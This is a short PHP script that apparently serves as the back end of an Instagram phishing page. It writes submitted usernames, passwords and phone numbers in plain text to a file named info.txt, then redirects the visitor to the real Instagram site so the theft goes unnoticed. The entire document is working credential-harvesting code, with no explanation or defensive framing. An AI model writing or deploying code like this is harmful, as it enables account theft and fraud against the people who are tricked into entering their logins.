<?php 
    file_put_contents("info.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] ."Number: " . $_POST['number'] . "\n", FILE_APPEND);
    header('Location: https://instagram.com')
?>